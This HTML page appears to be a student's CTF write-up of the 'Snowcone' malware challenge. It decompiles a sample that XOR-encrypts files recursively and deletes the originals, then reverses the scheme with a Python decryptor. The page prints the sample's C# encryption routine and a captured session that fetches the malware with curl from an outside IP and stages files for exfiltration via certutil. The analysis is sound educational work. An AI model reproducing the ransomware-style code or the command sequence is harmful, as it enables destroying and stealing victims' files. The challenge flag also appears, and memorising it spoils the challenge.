@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Another day, another intrusion here at IcyRetina. Can you help recover the encrypted files APT42 stole from this victim?
+ The catagory of this challenge is malware. To start, we are given a pcapng file named snowcone. Opening this up in Wireshark we are able to see an interesting http stream with the info of GET /snowcone.exe HTTP/1.1.
+  Exporting this stream as an http object will allow us to get the file." />
+<meta name="keywords" content=", osuleague, ctf, security" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="localhost/blog/snowcone-writeup/" />
+
+
+    <title>
+        
+            OSU League 2020/2021 - Snowcone Writeup :: Cameron McCawley 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/localhost/main.d7bdd8ee18bfbf4c605488a7e5b1b92cd980dfeed2bdaeab4dd5e931a7a78bc0.css">
+
+
+
+
+
+
+<meta itemprop="name" content="OSU League 2020/2021 - Snowcone Writeup">
+<meta itemprop="description" content="Another day, another intrusion here at IcyRetina. Can you help recover the encrypted files APT42 stole from this victim?
+ The catagory of this challenge is malware. To start, we are given a pcapng file named snowcone. Opening this up in Wireshark we are able to see an interesting http stream with the info of GET /snowcone.exe HTTP/1.1.
+  Exporting this stream as an http object will allow us to get the file.">
+<meta itemprop="datePublished" content="2021-02-01T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2021-02-01T00:00:00+00:00" />
+<meta itemprop="wordCount" content="1511">
+<meta itemprop="image" content="localhost"/>
+
+
+
+<meta itemprop="keywords" content="osuleague,ctf,security," />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="localhost"/>
+
+<meta name="twitter:title" content="OSU League 2020/2021 - Snowcone Writeup"/>
+<meta name="twitter:description" content="Another day, another intrusion here at IcyRetina. Can you help recover the encrypted files APT42 stole from this victim?
+ The catagory of this challenge is malware. To start, we are given a pcapng file named snowcone. Opening this up in Wireshark we are able to see an interesting http stream with the info of GET /snowcone.exe HTTP/1.1.
+  Exporting this stream as an http object will allow us to get the file."/>
+
+
+
+
+    <meta property="og:title" content="OSU League 2020/2021 - Snowcone Writeup" />
+<meta property="og:description" content="Another day, another intrusion here at IcyRetina. Can you help recover the encrypted files APT42 stole from this victim?
+ The catagory of this challenge is malware. To start, we are given a pcapng file named snowcone. Opening this up in Wireshark we are able to see an interesting http stream with the info of GET /snowcone.exe HTTP/1.1.
+  Exporting this stream as an http object will allow us to get the file." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="localhost/blog/snowcone-writeup/" />
+<meta property="og:image" content="localhost"/>
+<meta property="article:published_time" content="2021-02-01T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-02-01T00:00:00+00:00" /><meta property="og:site_name" content="Cameron McCawley" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2021-02-01 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">cd ~/cameronmccawley</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/localhost/about/">About</a></li><li><a href="/localhost/blog/">Blog</a></li><li><a href="/localhost/resume.pdf">Resume</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="localhost/blog/snowcone-writeup/">OSU League 2020/2021 - Snowcone Writeup</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <blockquote>
+<p>Another day, another intrusion here at IcyRetina. Can you help recover the encrypted files APT42 stole from this victim?</p>
+</blockquote>
+<p>The catagory of this challenge is malware. To start, we are given a pcapng file named <code>snowcone</code>. Opening this up in Wireshark we are able to see an interesting http stream with the info of <code>GET /snowcone.exe HTTP/1.1</code>.</p>
+<figure>
+    <img src="/img/wireshark_1.png"/> 
+</figure>
+
+<p>Exporting this stream as an http object will allow us to get the file. So after going to file -&gt; export objects -&gt; http, we are able to download the executable.</p>
+<p>Now, I really didn&rsquo;t want to run this on my machine, as it is literally a piece of malware, so I instead went with some static analysis. I used <code>dnSpy</code>, as was reccomended for decompilation, and looking at the code we can start to get an understanding of what it&rsquo;s doing.</p>
+<p>To start, let&rsquo;s look at main:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">using</span> System;
+<span style="color:#66d9ef">using</span> System.Text;
+<span style="color:#66d9ef">using</span> Snowcone.Properties;
+
+<span style="color:#66d9ef">namespace</span> Snowcone
+{
+	<span style="color:#75715e">// Token: 0x02000004 RID: 4
+</span><span style="color:#75715e"></span>	internal <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Program</span>
+	{
+		<span style="color:#75715e">// Token: 0x06000009 RID: 9 RVA: 0x00002290 File Offset: 0x00000490
+</span><span style="color:#75715e"></span>		<span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">Main</span>(string[] args)
+		{
+			<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>SnowHelper.WillItSnow())
+			{
+				Console.WriteLine(<span style="color:#e6db74">&#34;it&#39;s not going to snow here :(&#34;</span>);
+				<span style="color:#66d9ef">return</span>;
+			}
+			<span style="color:#66d9ef">if</span> (args.Length <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
+			{
+				Console.WriteLine(<span style="color:#e6db74">&#34;lol you forgot how to make it snow!&#34;</span>);
+				Console.WriteLine(<span style="color:#e6db74">&#34;usage: snowcone.exe [dir [dir [dir [...]]]&#34;</span>);
+				<span style="color:#66d9ef">return</span>;
+			}
+			SnowMachine.OTP(Encoding.ASCII.GetBytes(Resources.key));
+			<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> args.Length; i<span style="color:#f92672">++</span>)
+			{
+				SnowMachine.MakeItSnow(args[i]);
+			}
+		}
+	}
+}
+</code></pre></div><p>We can see here that the program checks to see if the function <code>WillItSnow()</code> returns true.  If it doesn&rsquo;t, then the program exits. It seems that all <code>WillItSnow()</code> does is check to see if the user&rsquo;s host name is equal to the one listed in the excecutable&rsquo;s resources.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">WillItSnow</span>()
+{
+	<span style="color:#66d9ef">return</span> Dns.GetHostName() <span style="color:#f92672">==</span> Resources.host;
+}
+</code></pre></div><p>Since our hostname isn&rsquo;t what is listed in the program, we know that this program won&rsquo;t work on our machine, as it will just instantly return due to a mismatch. But let&rsquo;s keep going.  Next the program just checks to see if the user didn&rsquo;t supply any arguments, and if they didn&rsquo;t, then return.  The last bit here is where it gets juicy.  The function <code>SnowMachine.MakeItSnow(args[i]);</code> is called.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">MakeItSnow</span>(string dir)
+{
+	string[] array <span style="color:#f92672">=</span> Directory.GetFiles(dir);
+	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> array.Length; i<span style="color:#f92672">++</span>)
+	{
+		SnowMachine.SmallSnowcone(array[i]);
+	}
+	array <span style="color:#f92672">=</span> Directory.GetDirectories(dir);
+	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> array.Length; i<span style="color:#f92672">++</span>)
+	{
+		SnowMachine.MakeItSnow(array[i]);
+	}
+}
+</code></pre></div><p>Now what does this function do? Well, it takes a directory, and then recursivley traverses that directory, calling the function <code>SmallSnowcone()</code> on every single file it encounters. Knowing this is malware, we can probably already take a guess as to what it might be doing to those files, but let&rsquo;s keep digging.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">SmallSnowcone</span>(string path)
+{
+	<span style="color:#66d9ef">if</span> (path.EndsWith(<span style="color:#e6db74">&#34;.sn0w&#34;</span>))
+	{
+		<span style="color:#66d9ef">return</span>;
+	}
+	<span style="color:#66d9ef">using</span> (FileStream fileStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileStream(path, FileMode.Open, FileAccess.Read))
+	{
+		<span style="color:#66d9ef">using</span> (FileStream fileStream2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileStream(path <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.sn0w&#34;</span>, FileMode.Create, FileAccess.Write))
+		{
+			byte[] array <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> byte[fileStream.Length];
+			byte[] array2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> byte[fileStream.Length];
+			fileStream.Read(array, <span style="color:#ae81ff">0</span>, (<span style="color:#66d9ef">int</span>)fileStream.Length);
+			string text <span style="color:#f92672">=</span> SnowMachine.PickSomeFlavoring();
+			SnowMachine.SaltBaeDatFlavorIn(array, array2, text);
+			byte[] array3 <span style="color:#f92672">=</span> SnowMachine.OTP(Encoding.ASCII.GetBytes(text));
+			<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>; i<span style="color:#f92672">++</span>)
+			{
+				fileStream2.WriteByte(Convert.ToByte((<span style="color:#66d9ef">int</span>)(array3[i] <span style="color:#f92672">|</span> <span style="color:#ae81ff">128</span>)));
+			}
+			fileStream2.Write(array2, <span style="color:#ae81ff">0</span>, array2.Length);
+		}
+	}
+	File.Delete(path);
+}
+</code></pre></div><p><code>SmallSnowcone()</code> is definitely the meat of our program here.  It takes in a path to a file, does some funky encryption to said file, and saves it with the extention <code>.sn0w</code> while deleting the original unencrypted file. This is probably the function that we are going to try and reverse. But what are we reversing it for? Surely we must be trying to decrypt some flag. Maybe looking back at the TCP stream could give us a hint.</p>
+<p>Opening up Wireshark again, I took a look at on of the TCP streams and followed it.</p>
+<pre><code>C:\Users\Administrator&gt;curl http://54.202.2.132:7331/snowcone.exe &gt; snowcone.exe
+curl http://54.202.2.132:7331/snowcone.exe &gt; snowcone.exe
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+100  8192  100  8192    0     0   8192      0  0:00:01 --:--:--  0:00:01 8000k
+
+C:\Users\Administrator&gt;.\snowcone.exe super_sensitive_documents
+.\snowcone.exe super_sensitive_documents
+
+C:\Users\Administrator&gt;tar -acf exfil.zip super_sensitive_documents
+tar -acf exfil.zip super_sensitive_documents
+
+C:\Users\Administrator&gt;certutil -encode exfil.zip exfil.zip.b64
+certutil -encode exfil.zip exfil.zip.b64
+Input Length = 281020
+Output Length = 386462
+CertUtil: -encode command completed successfully.
+
+C:\Users\Administrator&gt;type exfil.zip.b64
+type exfil.zip.b64
+-----BEGIN CERTIFICATE-----
+UEsDBBQAAAAAAEQBO1IAAAAAAAAAAAAAAAAaACAAc3VwZXJfc2Vuc2l0aXZlX2Rv
+Y3VtZW50cy9VVA0AB2GvEGBhrxBgRawQYHV4CwABBAAAAAAEAAAAAFBLAwQUAAgA
+                        ...
+bHNlY3VyaXR5Y2FyZC5qcGcuc24wd1VUDQAHYa8QYGGvEGBhrxBgdXgLAAEEAAAA
+AAQAAAAAUEsFBgAAAAAEAAQA2QEAAM1HBAAAAA==
+-----END CERTIFICATE-----
+</code></pre><p>We are given a lot of information here, so let&rsquo;s take a look at it command by command.  First, we see that the user downloaded the piece of malware using curl. They then ran the program with the directory <code>super_sensitive_documents</code> as input.  As we know from the code, this directory is now surely encrypted.  The user then zips the directory, and encodes it with base 64 to create a certificate representation of it.  Knowing this, we can recover the encoded directory by just decoding the base 64, which would leave us with the original <code>.zip</code>.</p>
+<p>After doing this, we can see the contents of <code>super_sensitive_documents</code>:</p>
+<pre><code>$tree super_sensitive_documents
+super_sensitive_documents/
+├── flag.txt.sn0w
+├── passport.jpg.sn0w
+└── socialsecuritycard.jpg.sn0w
+
+$hexdump super_sensitive_documents/flag.txt.sn0w
+0000000 f0b3 8aad ac86 f2f3 8190 98ac a7ad a489
+0000010 b8ae aafb a186 a8f0 b2ad b381 f1b4 888f
+0000020 411e 331a 0875 596e 1c26 6a0a 165c 3225
+0000030 4f33 0757 3c33 0703 3730 3f2c 0718 3912
+0000040 5704 3b30 030b 5202 2762 2717
+000004c
+</code></pre><p>Perfect.  There is our flag.txt.sn0w, and as expected it has been encrypted to a bunch of gibberish.  Now that we have a file we want to decrypt, let&rsquo;s go back to reversing that <code>SmallSnowcone()</code> function.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">SmallSnowcone</span>(string path)
+{
+	<span style="color:#66d9ef">if</span> (path.EndsWith(<span style="color:#e6db74">&#34;.sn0w&#34;</span>))
+	{
+		<span style="color:#66d9ef">return</span>;
+	}
+	<span style="color:#66d9ef">using</span> (FileStream fileStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileStream(path, FileMode.Open, FileAccess.Read))
+	{
+		<span style="color:#66d9ef">using</span> (FileStream fileStream2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileStream(path <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.sn0w&#34;</span>, FileMode.Create, FileAccess.Write))
+		{
+			byte[] array <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> byte[fileStream.Length];
+			byte[] array2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> byte[fileStream.Length];
+			fileStream.Read(array, <span style="color:#ae81ff">0</span>, (<span style="color:#66d9ef">int</span>)fileStream.Length);
+			string text <span style="color:#f92672">=</span> SnowMachine.PickSomeFlavoring();
+			SnowMachine.SaltBaeDatFlavorIn(array, array2, text);
+			byte[] array3 <span style="color:#f92672">=</span> SnowMachine.OTP(Encoding.ASCII.GetBytes(text));
+			<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>; i<span style="color:#f92672">++</span>)
+			{
+				fileStream2.WriteByte(Convert.ToByte((<span style="color:#66d9ef">int</span>)(array3[i] <span style="color:#f92672">|</span> <span style="color:#ae81ff">128</span>)));
+			}
+			fileStream2.Write(array2, <span style="color:#ae81ff">0</span>, array2.Length);
+		}
+	}
+	File.Delete(path);
+}
+</code></pre></div><p>So, we can see that our file is placed into the byte array <code>array</code>. After that, we have a string <code>text</code> which set to whatever is returned from <code>PickSomeFlavoring()</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> string <span style="color:#a6e22e">PickSomeFlavoring</span>()
+{
+	string text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span>;
+	string text2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+	<span style="color:#66d9ef">using</span> (RNGCryptoServiceProvider rngcryptoServiceProvider <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> RNGCryptoServiceProvider())
+	{
+		<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>; i<span style="color:#f92672">++</span>)
+		{
+			byte[] array <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> byte[<span style="color:#ae81ff">1</span>];
+			rngcryptoServiceProvider.GetBytes(array);
+			text2 <span style="color:#f92672">+=</span> text[(<span style="color:#66d9ef">int</span>)array[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">%</span> text.Length].ToString();
+		}
+	}
+	<span style="color:#66d9ef">return</span> text2;
+}
+</code></pre></div><p>This function creates a 32 random character string using <code>RNGCryptoServiceProvide</code>, so there is no breaking that for now. The random string is returned and set to <code>text</code>.</p>
+<p>Next, <code>SnowMachine.SaltBaeDatFlavorIn(array, array2, text);</code> is called.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">SaltBaeDatFlavorIn</span>(byte[] file, byte[] snow, string flavor)
+{
+	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> file.Length; i<span style="color:#f92672">++</span>)
+	{
+		snow[i] <span style="color:#f92672">=</span> Convert.ToByte((<span style="color:#66d9ef">int</span>)((<span style="color:#66d9ef">char</span>)file[i] <span style="color:#f92672">^</span> flavor[i <span style="color:#f92672">%</span> <span style="color:#ae81ff">32</span>]));
+	}
+}
+</code></pre></div><p>This just performs a bitwise XOR on each byte of the file with each byte of the random string <code>text</code>. This new encrypted string of bytes is now stored in <code>array2</code>, where it continues to be encrypted.</p>
+<p>Next thing to happen in our <code>SmallSnowcone()</code> function is the creation of <code>array3</code>, which is set from calling the function <code>OTP()</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> byte[] OTP(byte[] input)
+{
+	byte[] array <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> byte[input.Length];
+	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> input.Length; i<span style="color:#f92672">++</span>)
+	{
+		array[i] <span style="color:#f92672">=</span> Convert.ToByte((<span style="color:#66d9ef">int</span>)(input[i] <span style="color:#f92672">^</span> <span style="color:#ae81ff">66</span>));
+	}
+	<span style="color:#66d9ef">return</span> array;
+}
+</code></pre></div><p>This function just XORs each byte with 66, and stores the result in <code>array3</code></p>
+<p>Finally, our <code>SmallSnowcone()</code> function performs a bitwise OR operation on each byte in <code>array3</code> with the value <code>128</code>, which is then what is finally written to the <code>.sn0w</code> file.</p>
+<p>Great! Now that we know exactly how our files are being encrypted, we should be able to work backwards to decrypt the file. The first thing to undo is the bitwise OR operation. What&rsquo;s interesting about this is that it is done with <code>128</code>, or <code>10000000</code> in binary.  This means only the most significant bit is being ORed.  Since we know that our key which we are trying to decrypt is all ASCII, and since we know that ASCII value <code>127</code> is the max, we know that the most significant bit is never going to be set.  So the value that was ORed with had to have a significant bit of 0.</p>
+<p>So we know that the significant bit of each byte of the key is 0. The next step is to undo the XOR operation with 66. Since XOR is its own inverse, we can just take the XOR of each byte of our encrypted array with 66 and we will get the key!</p>
+<p>Doing this yeilds a key of <code>q2oHDn10RCnZoeKflz9hDc2jopCqv3MJ</code></p>
+<p>Now we can run through our encrypted file and XOR each byte with the corresponding values of our key. This will result in the original unencrypted file!</p>
+<p>Let&rsquo;s script it out in python:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">enc_flag <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;./flag.txt.sn0w&#34;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>)
+contents <span style="color:#f92672">=</span> enc_flag<span style="color:#f92672">.</span>read()
+
+xored <span style="color:#f92672">=</span> contents[:<span style="color:#ae81ff">32</span>] 
+
+key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+
+<span style="color:#66d9ef">for</span> byte <span style="color:#f92672">in</span> xored:
+    key <span style="color:#f92672">+=</span> chr((byte <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x7f</span>)<span style="color:#f92672">^</span><span style="color:#ae81ff">66</span>)  <span style="color:#75715e"># (01111111 &amp; 10110011) ^ 01000010 = key</span>
+
+contents <span style="color:#f92672">=</span> contents[<span style="color:#ae81ff">32</span>:]
+output <span style="color:#f92672">=</span> bytes()
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(contents)):
+    output <span style="color:#f92672">+=</span> bytes([contents[i] <span style="color:#f92672">^</span> ord(key[i <span style="color:#f92672">%</span> <span style="color:#ae81ff">0x20</span>])])
+
+<span style="color:#66d9ef">print</span>(output)
+</code></pre></div><p>And running it we get the flag!</p>
+<pre><code>osu{1f_it_d03snT_5now_1m_GoNn4_sue_sOm3b0dy}
+</code></pre>
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="localhost/tags/osuleague/">osuleague</a></span>
+        <span class="tag"><a href="localhost/tags/ctf/">ctf</a></span>
+        <span class="tag"><a href="localhost/tags/security/">security</a></span>
+        
+    </p>
+
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2021</span>
+            
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span><span><a href="localhost/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+          </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/localhost/bundle.min.af435e44374f1e99a669ea8cd5bb9a2fceed80588941a451bfddb66b86a67c9f40b0f417e9543a763f809aa7e9300d7b1d69bf99615810ba02ac70396d50fad5.js" integrity="sha512-r0NeRDdPHpmmaeqM1buaL87tgFiJQaRRv922a4amfJ9AsPQX6VQ6dj&#43;AmqfpMA17HWm/mWFYELoCrHA5bVD61Q=="></script>
+
+
+
+    </body>
+</html>
